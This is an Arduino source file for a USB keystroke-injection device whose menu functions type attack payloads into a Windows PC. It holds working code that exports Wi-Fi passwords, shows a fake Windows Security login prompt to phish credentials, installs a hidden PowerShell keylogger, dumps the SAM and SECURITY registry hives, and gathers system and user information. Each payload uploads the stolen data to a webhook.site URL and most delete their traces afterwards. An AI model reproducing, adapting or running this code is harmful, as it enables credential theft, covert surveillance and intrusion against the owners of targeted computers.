#include "Keyboard.h"  // might have to change to bracket to work


//change the url to yours
String webhook_link = "https://webhook.site/b69f0492-181f-451b-a03e-b86cfec25904";

// Initialise windows button variables
char ctrlKey = KEY_LEFT_CTRL;
char win = KEY_RIGHT_GUI;
char enter = KEY_KP_ENTER;
char tab = KEY_TAB;
char ctrl = KEY_LEFT_CTRL;
char shift = KEY_LEFT_SHIFT;

// Print success message of function working on index page
void executeSuccess(char nameArr[90]) {
  SerialMonitorInterface.print("Function success");
  displayBuffer.clearWindow(0, 8, 96, 64);
  char success[] = " success";
  strncat(nameArr, success, sizeof(success));
  displayBuffer.setCursor(15, menuTextY[4]);
  displayBuffer.print(nameArr);
  delay(2000);

  // return back to main menu
  currentMenu = 0;
  currentMenuLine = 0;
  lastMenuLine = -1;
  currentSelectionLine = 0;
  lastSelectionLine = -1;
  currentDisplayState = displayStateHome;
  updateMainDisplay();
}

// steal wifi password by controlling target's keyboard
// working on windows platform only
void getWifi() {
  // Open cmd and run with admin privs
  Keyboard.press(win);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(600);

  Keyboard.print("cmd /k mode con: cols=15 lines=1");
  Keyboard.press(ctrl);
  Keyboard.press(shift);
  Keyboard.press(enter);
  Keyboard.releaseAll();
  delay(5000);
  Keyboard.write(tab);
  delay(400);
  Keyboard.write(tab);
  delay(400);
  Keyboard.write(enter);
  delay(1000);

  // cmd commands
  Keyboard.println("cd %temp%");
  delay(500);

  // Grab wifi passwd info
  Keyboard.println("netsh wlan export profile key=clear");
  delay(500);

  Keyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
  delay(500);

  // Send to webhook
  String sendWebhook = String("powershell Invoke-WebRequest -Uri " + webhook_link + " -Method POST -InFile Wi-Fi-PASS");
  Keyboard.println(sendWebhook);
  delay(500);

  // Clean up
  Keyboard.println("del Wi-* /s /f /q");
  delay(500);
  Keyboard.println("exit");

  // return success
  char name[90] = "Get Wifi";
  executeSuccess(name);
}

// steal windows credentials
// working on windows platform only
void windowsPhisher() {
  // Open powershell and run with admin privs
  Keyboard.press(win);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(600);

  Keyboard.print("powershell -noexit -command \"mode con cols=18 lines=1\"");
  Keyboard.press(ctrl);
  Keyboard.press(shift);
  Keyboard.press(enter);
  Keyboard.releaseAll();
  delay(5000);
  Keyboard.write(tab);
  delay(400);
  Keyboard.write(tab);
  delay(400);
  Keyboard.write(enter);
  delay(1000);

  String sendWebhook2 = String("PowerShell.exe -windowstyle hidden {Start-Sleep -s 30;Add-Type -assemblyname system.DirectoryServices.accountmanagement;$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);$domainDN = \"LDAP://\" + ([ADSI]"
                               ").distinguishedName;while($true){$credential = $host.ui.PromptForCredential(\"Windows Security\", \"Enter your credentials\", \"\", \"\");if($credential){$creds = $credential.GetNetworkCredential();[String]$user = $creds.username;[String]$pass = $creds.password;[String]$domain = $creds.domain;$authlocal = $DS.ValidateCredentials($user, $pass);$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){$script:pastevalue = \"Username: \" + $user + \" Password: \" + $pass + \" Domain:\" + $domain + \" Domain:\"+ $authdomain.name;break}}};Invoke-WebRequest -Uri "
                               + webhook_link + " -Method POST -Body $pastevalue}");
  Keyboard.println(sendWebhook2);

  // return success
  char name[90] = "Get Creds";
  executeSuccess(name);
}

// install keylogger onto the target's pc
// working on windows platform only
void keylogger() {
  Keyboard.press(win);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell");
  delay(500);
  String sendWebhook3 = String("$put = \"`$t`='[DllImport(\"\"user32.dll\"\")] public static extern bool ShowWindow(int handle, int state);'\nadd-type -name win -member `$t` -namespace native\n[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)\nfunction Start-KeyLogger(`$P`=\"\"`$env`:temp\\kl.txt\"\")\n{\n `$si` = @'\n[DllImport(\"\"user32.dll\"\", CharSet=CharSet.Auto, ExactSpelling=true)]\npublic static extern short GetAsyncKeyState(int virtualKeyCode);\n[DllImport(\"\"user32.dll\"\", CharSet=CharSet.Auto)]\npublic static extern int GetKeyboardState(byte[] keystate);\n[DllImport(\"\"user32.dll\"\", CharSet=CharSet.Auto)]\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\n[DllImport(\"\"user32.dll\"\", CharSet=CharSet.Auto)]\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\n'@\n`$A` = Add-Type -MemberDefinition `$si` -Name 'Win32' -Namespace API -PassThru\n`$null` = New-Item -Path `$P` -ItemType File -Force\ntry\n{\n`$ti` = get-date\ndo\n{\nStart-Sleep -Milliseconds 40\nfor (`$as` = 9; `$as` -le 254; `$as`++) {\n`$state` = `$A`::GetAsyncKeyState(`$as`)\nif (`$state` -eq -32767) {\n`$null` = [console]::CapsLock\n`$VK` = `$A`::MapVirtualKey(`$as`, 3)\n`$kbS` = New-Object Byte[] 256\n`$checkkbstate` = `$A`::GetKeyboardState(`$kbS`)\n`$mychar` = New-Object -TypeName System.Text.StringBuilder\n`$success` = `$A`::ToUnicode(`$as`, `$VK`, `$kbS`, `$mychar`, `$mychar`.Capacity, 0)\nif (`$success`)\n{\n[System.IO.File]::AppendAllText(`$P`, `$mychar`, [System.Text.Encoding]::Unicode)\n}}}}\nwhile ((Get-Date).AddMinutes(-1) -le `$ti`)\n}\nfinally\n{\npowershell Invoke-WebRequest -Uri 'https://webhook.site/b69f0492-181f-451b-a03e-b86cfec25904' -Method POST -ContentType 'text/plain' -InFile \"\"`$env`:temp\\kl.txt\"\"\npowershell Remove-Item -Path \"\"`$env`:temp\\kl.txt\"\"\npowershell Remove-Item -Path \"\"`$env`:temp\\log.ps1\"\"\n}}\nStart-KeyLogger\"");
  Keyboard.println(sendWebhook3);
  delay(2000);
  Keyboard.press(enter);
  Keyboard.releaseAll();
  Keyboard.println("write-output $put > $env:temp\\log.ps1");
  delay(500);
  Keyboard.press(enter);
  Keyboard.releaseAll();
  Keyboard.println("cd $env:temp");
  Keyboard.press(enter);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(".\\log.ps1");
  delay(500);
  Keyboard.press(enter);
  Keyboard.releaseAll();

  // return success
  char name[90] = "Keylogger";
  executeSuccess(name);
}

// get Security Accounts Manager files from PC
// working on windows platform only
void samDumper() {
  Keyboard.press(win);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell -command \"start-process powershell -verb runAs\"");
  delay(500);
  Keyboard.press(enter);
  Keyboard.releaseAll();
  Keyboard.println("mode con cols=18 lines=1");
  delay(500);
  Keyboard.press(enter);
  Keyboard.releaseAll();
  Keyboard.println("Set-ExecutionPolicy Unrestricted -Force");
  delay(500);
  Keyboard.press(enter);
  Keyboard.releaseAll();
  String sendWebhook5 = String("$put = \"Install-Module DSInternals -Force\nreg save HKLM\\SAM SA.B\nreg save HKLM\\SECURITY SE.B\n`$BootKey`= Get-BootKey -Online\n`$U`='https://webhook.site/b69f0492-181f-451b-a03e-b86cfec25904'\nInvoke-WebRequest -Uri `$U` -Method POST -Infile SA.B\nInvoke-WebRequest -Uri `$U` -Method POST -Infile SE.B\nInvoke-WebRequest -Uri `$U` -Method POST -Body @{Bootkey=`$BootKey`}\ndel *.B\"");
  Keyboard.println(sendWebhook5);
  delay(500);
  Keyboard.press(enter);
  Keyboard.releaseAll();
  Keyboard.println("write-output $put > $env:temp\\log.ps1");
  delay(500);
  Keyboard.press(enter);
  Keyboard.releaseAll();
  Keyboard.println("cd $env:temp");
  Keyboard.press(enter);
  Keyboard.releaseAll();
  Keyboard.println(".\\log.ps1");
  delay(500);
  Keyboard.press(enter);
  Keyboard.releaseAll();

  // return success
  char name[90] = "Get SAM Files";
  executeSuccess(name);
}

void getSysinfo() {
   // Open cmd and run with admin privs
  Keyboard.press(win);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(600);

  Keyboard.print("cmd /k mode con: cols=15 lines=1");
  Keyboard.press(ctrl);
  Keyboard.press(shift);
  Keyboard.press(enter);
  Keyboard.releaseAll();
  delay(5000);
  Keyboard.write(tab);
  delay(400);
  Keyboard.write(tab);
  delay(400);
  Keyboard.write(enter);
  delay(1000);

  // cmd commands
  Keyboard.println("cd %temp%");
  delay(500);

  Keyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Sys-PASS");
  delay(500);

  // Grab the systeminfo, ensure that it appends and not overwrites
  Keyboard.println("systeminfo >> Sys-PASS");
  delay(4500);  // I measured somewhere around 4s on average.

  // Grab drivers
  Keyboard.println("driverquery >> Sys-PASS");
  delay(500);

  // Grab local users
  Keyboard.println("net user >> Sys-PASS");
  delay(500);

  // Grab list of running processes
  Keyboard.println("tasklist /svc >> Sys-PASS");
  delay(500);

  // Send to webhook
  String sendWebhook = String("powershell Invoke-WebRequest -Uri " + webhook_link + " -Method POST -InFile Sys-PASS");
  Keyboard.println(sendWebhook);
  delay(500);

  // Clean up
  Keyboard.println("del Wi-* /s /f /q");
  delay(500);
  Keyboard.println("exit");

  // return success
  char name[90] = "Get Sys Info";
  executeSuccess(name);
}